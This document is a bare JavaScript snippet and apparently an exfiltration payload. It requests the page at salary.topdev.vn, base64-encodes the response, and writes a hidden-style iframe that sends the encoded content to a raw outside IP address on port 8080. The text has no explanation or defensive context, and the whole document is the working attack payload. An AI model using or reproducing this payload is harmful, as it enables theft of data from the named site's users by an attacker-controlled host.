function reqListener () {
var b64 = btoa(this.responseText);
document.write('<iframe src="http://34.93.239.168:8080/?a='+b64+'"></iframe>');
} 
var req = new XMLHttpRequest(); 
req.addEventListener("load", reqListener); 
req.open("GET", "https://salary.topdev.vn"); 
req.send();
